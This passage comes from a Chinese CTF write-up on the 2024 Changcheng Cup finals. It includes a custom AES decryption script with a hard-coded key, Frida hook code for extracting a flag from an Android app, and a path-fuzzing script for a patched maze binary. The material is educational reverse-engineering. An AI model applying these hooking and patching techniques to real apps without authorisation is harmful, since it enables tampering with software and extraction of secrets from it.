class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x84</span>,<br>           <span class="hljs-number">0x90</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x06</span>,<br>           <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0x6b</span>,<br>           <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x73</span>,<br>           <span class="hljs-number">0x96</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xdf</span>, <span class="hljs-number">0x6e</span>,<br>           <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x1b</span>,<br>           <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xf4</span>,<br>           <span class="hljs-number">0x1f</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xef</span>,<br>           <span class="hljs-number">0xa0</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x61</span>,<br>           <span class="hljs-number">0x17</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x7d</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,Key,Mode=<span class="hljs-number">0</span>,Enc_type=<span class="hljs-number">128</span></span>):<br>        <span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(self.S_Box):<br>            self.D_Box[v^<span class="hljs-number">0xa1</span>]=i<br>        e=[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,\<br>           <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,\<br>           <span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,\<br>           <span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>]<br>        self.e=self.toMatrix(e)[<span class="hljs-number">0</span>]<br>        self.Round_num=Enc_type//<span class="hljs-number">32</span>+<span class="hljs-number">8</span>-<span class="hljs-number">2</span><br>        self.Enc_type=Enc_type<br>        self.Key=Key<br>        self.Mode=Mode<br>        <span class="hljs-keyword">pass</span><br>    <br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Rot_Word</span>(<span class="hljs-params">self,Raw_data,Rot_Num=<span class="hljs-number">1</span></span>):<br>        Raw_len=<span class="hljs-built_in">len</span>(Raw_data)<br>        New_data=[]<br>        i=Rot_Num<br>        New_len=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> New_len&lt;Raw_len:<br>            New_data.append(Raw_data[i%Raw_len])<br>            i=i+<span class="hljs-number">1</span><br>            New_len+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> New_data<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SubBytes</span>(<span class="hljs-params">self,Raw_data,Box,en=<span class="hljs-literal">True</span></span>):<br>        New_data=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Raw_data:<br>            New_Row=[]<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>                New_Row.append(Box[j])<br>            New_data.append(New_Row)<br>        <span class="hljs-keyword">return</span> New_data<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">T</span>(<span class="hljs-params">self,Raw_data,Round_N</span>):<br>        New_data=self.SubBytes([self.Rot_Word(Raw_data)],self.S_Box)[<span class="hljs-number">0</span>]<br>        New_data[<span class="hljs-number">0</span>]^=self.Rcon[Round_N]<br>        <span class="hljs-keyword">return</span> New_data<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">ExtentKey</span>(<span class="hljs-params">self,Key_data : <span class="hljs-built_in">list</span></span>):<br>        Ext_Key=Key_data.copy()<br>        i=<span class="hljs-built_in">len</span>(Key_data)<br>        Step=self.Enc_type//<span class="hljs-number">32</span><br>        <span class="hljs-keyword">while</span> i&lt;self.Round_num*<span class="hljs-number">4</span>+<span class="hljs-number">4</span>:<br>            New_k=[]<br>            <span class="hljs-keyword">if</span> Step==<span class="hljs-number">8</span> <span class="hljs-keyword">and</span> i%<span class="hljs-number">8</span>==<span class="hljs-number">4</span>:<br>                Sub_Key=self.SubBytes([Ext_Key[i-<span class="hljs-number">1</span>]],self.S_Box)[<span class="hljs-number">0</span>]<br>                <span class="hljs-keyword">for</span> j,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(Ext_Key[i-Step]):<br>                    New_k.append(Sub_Key[j]^v)<br>            <span class="hljs-keyword">elif</span> i%Step != <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">for</span> j,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(Ext_Key[i-Step]):<br>                    New_k.append(Ext_Key[i-<span class="hljs-number">1</span>][j]^v)<br>            <span class="hljs-keyword">else</span>:<br>                T_Key=self.T(Ext_Key[i-<span class="hljs-number">1</span>],i//Step-<span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">for</span> j,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(Ext_Key[i-Step]):<br>                   New_k.append(T_Key[j]^v)<br>            Ext_Key.append(New_k)<br>            i+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> Ext_Key<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">ShiftRow</span>(<span class="hljs-params">self,Row_data,dire=<span class="hljs-literal">True</span></span>):<br>        New_data=[]<br>        Row_len=<span class="hljs-built_in">len</span>(Row_data)<br>        Col_len=<span class="hljs-built_in">len</span>(Row_data[<span class="hljs-number">0</span>])<br>        i=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> i&lt;Row_len:<br>            New_data.append([])<br>            j=<span class="hljs-number">0</span><br>            <span class="hljs-keyword">while</span> j&lt;Col_len:<br>                <span class="hljs-keyword">if</span> dire:<br>                    New_data[i].append(Row_data[ (j+i)%Row_len ][j])<br>                <span class="hljs-keyword">else</span>: <br>                    New_data[i].append(Row_data[ (Row_len-j+i)%Row_len ][ j ] )<br>                j+=<span class="hljs-number">1</span><br>            i+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> New_data<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Safe_Out2</span>(<span class="hljs-params">self,Raw_data</span>):<br>        Result=Raw_data<br>        Result=Result*<span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> Result&gt;=<span class="hljs-number">0x100</span>:<br>            Result=(Result&amp;<span class="hljs-number">0xff</span>)^<span class="hljs-number">0x1b</span><br>        <span class="hljs-keyword">return</span> Result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Safe_Out4</span>(<span class="hljs-params">self,Raw_data</span>):<br>        <span class="hljs-keyword">return</span> self.Safe_Out2(self.Safe_Out2(Raw_data))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Safe_Out8</span>(<span class="hljs-params">self,Raw_data</span>):<br>        <span class="hljs-keyword">return</span> self.Safe_Out4(self.Safe_Out2(Raw_data))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Safe_Mix</span>(<span class="hljs-params">self,Raw_data,Num</span>):<br>        Result=Raw_data<br>        <span class="hljs-keyword">if</span> Num==<span class="hljs-number">3</span>:<br>            Result=self.Safe_Out2(Result)^Raw_data<br>        <span class="hljs-keyword">elif</span> Num==<span class="hljs-number">2</span>:<br>            Result=self.Safe_Out2(Result)<br>        <span class="hljs-keyword">elif</span> Num==<span class="hljs-number">9</span>:<br>            Result=self.Safe_Out8(Result)^Raw_data<br>        <span class="hljs-keyword">elif</span> Num==<span class="hljs-number">11</span>:<br>            Result=self.Safe_Out8(Result)^self.Safe_Out2(Result)^Raw_data<br>        <span class="hljs-keyword">elif</span> Num==<span class="hljs-number">13</span>:<br>            Result=self.Safe_Out8(Result)^self.Safe_Out4(Result)^Raw_data<br>        <span class="hljs-keyword">elif</span> Num==<span class="hljs-number">14</span>:<br>            Result=self.Safe_Out8(Result)^self.Safe_Out4(Result)^self.Safe_Out2(Result)<br>        <span class="hljs-keyword">return</span> Result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Column_Mix</span>(<span class="hljs-params">self,Row_data,Mul_Mat</span>):<br>        New_data=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Row_data:<br>            <span class="hljs-comment">#New_Row=[0,0,0,0]</span><br>            New_Row=[<span class="hljs-number">0x54</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x54</span>]<br>            <span class="hljs-keyword">for</span> j,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(i):<br>                New_Row[<span class="hljs-number">0</span>]^=self.Safe_Mix(v,Mul_Mat[<span class="hljs-number">0</span>][j])<br>                New_Row[<span class="hljs-number">1</span>]^=self.Safe_Mix(v,Mul_Mat[<span class="hljs-number">1</span>][j])<br>                New_Row[<span class="hljs-number">2</span>]^=self.Safe_Mix(v,Mul_Mat[<span class="hljs-number">2</span>][j])<br>                New_Row[<span class="hljs-number">3</span>]^=self.Safe_Mix(v,Mul_Mat[<span class="hljs-number">3</span>][j])<br>            New_data.append(New_Row)<br>        <span class="hljs-keyword">return</span> New_data <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Column_Mix_</span>(<span class="hljs-params">self,Row_data,Mul_Mat</span>):<br>        New_data=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Row_data:<br>            New_Row=[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]<br>            <span class="hljs-comment">#New_Row=[0x54,0x54,0x54,0x54]</span><br>            <span class="hljs-keyword">for</span> j,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(i):<br>                New_Row[<span class="hljs-number">0</span>]^=self.Safe_Mix(v,Mul_Mat[<span class="hljs-number">0</span>][j])<br>                New_Row[<span class="hljs-number">1</span>]^=self.Safe_Mix(v,Mul_Mat[<span class="hljs-number">1</span>][j])<br>                New_Row[<span class="hljs-number">2</span>]^=self.Safe_Mix(v,Mul_Mat[<span class="hljs-number">2</span>][j])<br>                New_Row[<span class="hljs-number">3</span>]^=self.Safe_Mix(v,Mul_Mat[<span class="hljs-number">3</span>][j])<br>            New_data.append(New_Row)<br>        <span class="hljs-keyword">return</span> New_data <br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">xorMat</span>(<span class="hljs-params">self,Data_Mat,Key_Mat</span>):<br>        New_Mat=[]<br>        <span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(Data_Mat):<br>            New_Row=[]<br>            <span class="hljs-keyword">for</span> j,v1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(Data_Mat[i]):<br>                New_Row.append(v1^Key_Mat[i][j])<br>            New_Mat.append(New_Row)<br>        <span class="hljs-keyword">return</span> New_Mat<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">toMatrix</span>(<span class="hljs-params">self,data,Mat_W=<span class="hljs-number">4</span>,Mat_H=<span class="hljs-number">4</span></span>):<br>        Matrixs=[]<br>        w_i=<span class="hljs-number">0</span><br>        h_i=<span class="hljs-number">0</span><br>        Matrix=[]<br>        Matrix_Row=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>            Matrix_Row.append(i)<br>            w_i+=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> w_i &gt;= Mat_W:<br>                Matrix.append(Matrix_Row)<br>                Matrix_Row=[]<br>                w_i=<span class="hljs-number">0</span><br>                h_i+=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> h_i&gt;=Mat_H:<br>                Matrixs.append(Matrix)<br>                h_i=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">return</span> Matrixs<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">toList</span>(<span class="hljs-params">self,Raw_Mat</span>):<br>        Out_data=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Raw_Mat:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>                Out_data.append(j)<br>        <span class="hljs-keyword">return</span> Out_data<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self,Raw_data</span>):<br>        Key_Mat=self.toMatrix(self.Key)[<span class="hljs-number">0</span>]<br>        Exten_K=self.ExtentKey(Key_Mat)<br>        Key_Mat=Exten_K[self.Round_num*<span class="hljs-number">4</span>:self.Round_num*<span class="hljs-number">4</span>+<span class="hljs-number">4</span>]<br>        Plain=[]<br>        This_data=<span class="hljs-number">0</span><br>        <br>        De_len=<span class="hljs-built_in">len</span>(Raw_data)<br>        <span class="hljs-keyword">while</span> This_data &lt; De_len:<br>            T_de_data=self.toMatrix(Raw_data[This_data:This_data+<span class="hljs-number">16</span>])[<span class="hljs-number">0</span>]<br>            <br>            Key_Mat=self.xorMat(Key_Mat,self.e)<br>            T_de_data=self.xorMat(T_de_data,Key_Mat)<br>            This_Round=<span class="hljs-number">0</span><br>            This_Key=self.Round_num*<span class="hljs-number">4</span>-<span class="hljs-number">4</span><br>            <span class="hljs-keyword">while</span> This_Round &lt; self.Round_num:<br>                <br>                T_Key=Exten_K[This_Key:This_Key+<span class="hljs-number">4</span>]<br>                T_Key=self.xorMat(T_Key,self.e)<br>                T_de_data=self.SubBytes(T_de_data,self.D_Box,<span class="hljs-literal">False</span>)<br>                T_de_data=self.ShiftRow(T_de_data,dire=<span class="hljs-literal">False</span>)<br>                <span class="hljs-keyword">if</span> This_Round!=self.Round_num-<span class="hljs-number">1</span>:<br>                <br>                    T_de_data=self.Column_Mix(T_de_data,self.De_Status)<br>                    T_Key=self.Column_Mix_(T_Key,self.De_Status)<br>                <br>                T_de_data=self.xorMat(T_de_data,T_Key)<br>                <br>                This_Key-=<span class="hljs-number">4</span><br>                This_Round+=<span class="hljs-number">1</span><br>            <br>            Plain=Plain+self.toList(T_de_data)<br>            This_data+=<span class="hljs-number">16</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(Plain)<br><br>data=<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&#x27;B4 38 36 30 1E 68 48 57 51 01 B7 03 9B 98 E3 7E&#x27;</span>.split()))<br>key=<span class="hljs-string">b&#x27;gah43jJKgfjGMeAR&#x27;</span><br>a=aes(key)<br><span class="hljs-built_in">print</span>(a.decrypt(data))<br></code></pre></td></tr></table></figure><h2 id="要塞守护（赛后复现）">要塞守护（赛后复现）</h2><p><img src="/img/blog_img/2024%E7%AC%AC%E4%B8%80%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/%E8%A6%81%E5%A1%9E%E5%AE%88%E6%8A%A40.png" srcset="/img/loading.gif" lazyload alt=""><br>分析<code>apk</code>代码，发现存在<code>wcmm5ukk</code>与<code>information.db</code>两个资源文件，使用sqlite打开<code>information.db</code>之后里面是<code>fakeflag</code><br>在代码中存在两个密钥一个是<code>VWt1OEhOMkpnbU1VSnhzQw==</code>,另一个是<code>FCAr62VFBF9SRw8Z</code>这一个密钥已知是在调用<code>decrypt</code>函数时使用的</p><p>现在就剩两个东西没有找到用处，一个是<code>KEY</code>变量，<code>base64</code>解密之后为<code>Uku8HN2JgmMUJxsC</code>,另一个是<code>wcmm5ukk</code><br>尝试将其作为<code>sqlite</code>数据库文件，并使用KEY变量当作密钥<br><img src="/img/blog_img/2024%E7%AC%AC%E4%B8%80%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/%E8%A6%81%E5%A1%9E%E5%AE%88%E6%8A%A41.png" srcset="/img/loading.gif" lazyload alt=""></p><p>得到一串十六进制字符串，将其传入<code>decrypt</code>尝试解密,由于程序没有主动调用decrypt函数，所以需要<code>frida hook</code>之后调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> frida<br><span class="hljs-keyword">import</span> sys<br>script=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;script.js&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">message</span>(<span class="hljs-params">message,data</span>):<br>    <span class="hljs-keyword">global</span> num,f1<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;payload&#x27;</span>]==<span class="hljs-string">&#x27;test&#x27;</span>:<br>        putdata=[]<br>        putdata.append(<span class="hljs-string">&quot;a9f3718960505f6bba12e85b550db764922b4b97&quot;</span>)<br>        scr.post(&#123;<span class="hljs-string">&quot;data&quot;</span>:putdata&#125;)<br><br>rdev=frida.get_remote_device()<br>process=rdev.attach(<span class="hljs-string">&quot;要地守护&quot;</span>)<br>scr=process.create_script(script)<br><br>scr.on(<span class="hljs-string">&quot;message&quot;</span>,message)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;running&quot;</span>)<br>scr.load()<br>sys.stdin.read()<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-title class_">MainActivity</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.information.app1.MainActivity&quot;</span>);<br>    <span class="hljs-keyword">let</span> string=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;java.lang.String&quot;</span>);<br>    <span class="hljs-title class_">MainActivity</span>[<span class="hljs-string">&quot;showToast&quot;</span>].<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-title function_">recv</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">onMessage</span>(<span class="hljs-params">message</span>)&#123;<br>            <span class="hljs-keyword">let</span> <span class="hljs-title class_">Encryption</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.information.ndk.Encryption&quot;</span>);<br>            <br>            <span class="hljs-keyword">let</span> key=<span class="hljs-string">&quot;FCAr62VFBF9SRw8Z&quot;</span>;<br>            <span class="hljs-keyword">let</span> data=message.<span class="hljs-property">data</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;data.<span class="hljs-property">length</span>;i++)&#123;<br>                <span class="hljs-keyword">let</span> dedata=<span class="hljs-title class_">Encryption</span>[<span class="hljs-string">&quot;decrypt&quot;</span>](data[i],key);<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dedata);<br>            &#125;<br>        &#125;);<br>    &#125;;<br>&#125;)<br></code></pre></td></tr></table></figure><h2 id="mapmap（赛后复现）">mapmap（赛后复现）</h2><p>由于本人逆向功底有限，所以没有把地图逆向出来，但通过写脚本可以把完整路径fuzz出来<br>需要先patch一下程序，当输入其他字符时不输出<code>wrong</code>而是输出<code>flag&#123;md5(your input)&#125;</code>,来判断其他字符之前的路径是否正确</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>data=<span class="hljs-string">&quot;&quot;</span><br>base=&#123;<br>    <span class="hljs-string">&quot;w&quot;</span>:(<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>),<br>    <span class="hljs-string">&quot;s&quot;</span>:(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<br>    <span class="hljs-string">&quot;a&quot;</span>:(-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),<br>    <span class="hljs-string">&quot;d&quot;</span>:(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),<br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getdire</span>():<br>    x=<span class="hljs-number">0</span><br>    y=<span class="hljs-number">0</span><br>    dire=<span class="hljs-string">&#x27;&#x27;</span><br>    direct=<span class="hljs-string">&quot;wasd&quot;</span><br>    road=[]<br>    stack=[]<br>    i=<span class="hljs-number">0</span><br>    num=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> x!=<span class="hljs-number">0x26</span> <span class="hljs-keyword">or</span> y!=<span class="hljs-number">0x26</span>:<br>        <span class="hljs-keyword">while</span> i&lt;<span class="hljs-number">4</span>:<br>            x_,y_=base[direct[i]]<br>            x_=x+x_<br>            y_=y+y_<br>            <span class="hljs-keyword">if</span> x_ &lt;<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> y_&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> x_&gt;<span class="hljs-number">0x26</span> <span class="hljs-keyword">or</span> y_ &gt; <span class="hljs-number">0x26</span> <span class="hljs-keyword">or</span> (x_,y_) <span class="hljs-keyword">in</span> road:<br>                num+=<span class="hljs-number">1</span><br>                i+=<span class="hljs-number">1</span><br>                <span class="hljs-keyword">continue</span><br>            checkdata=(dire+direct[i]).ljust(<span class="hljs-number">0x8c</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>            os.system(<span class="hljs-string">f&quot;echo <span class="hljs-subst">&#123;checkdata&#125;</span> &gt; check&quot;</span>)<br><br>            d=os.popen(<span class="hljs-string">&quot;./mapmap1 &lt; check&quot;</span>).read().strip()<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wrong&#x27;</span> <span class="hljs-keyword">in</span> d:<br>                i+=<span class="hljs-number">1</span><br>                num+=<span class="hljs-number">1</span><br>                <span class="hljs-keyword">continue</span><br>            road.append((x,y))<br>            x,y=x_,y_<br>            dire=dire+direct[i]<br>            <span class="hljs-keyword">if</span> x==<span class="hljs-number">0x26</span> <span class="hljs-keyword">and</span> y==<span class="hljs-number">0x26</span>:<br>                <span class="hljs-keyword">return</span> dire<br>            stack.append((num+<span class="hljs-number">1</span>,i+<span class="hljs-number">1</span>))<br>            <span class="hljs-built_in">print</span>(dire)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> num==<span class="hljs-number">4</span>:<br>            num,i=stack.pop()<br>            x,y=road.pop()<br>            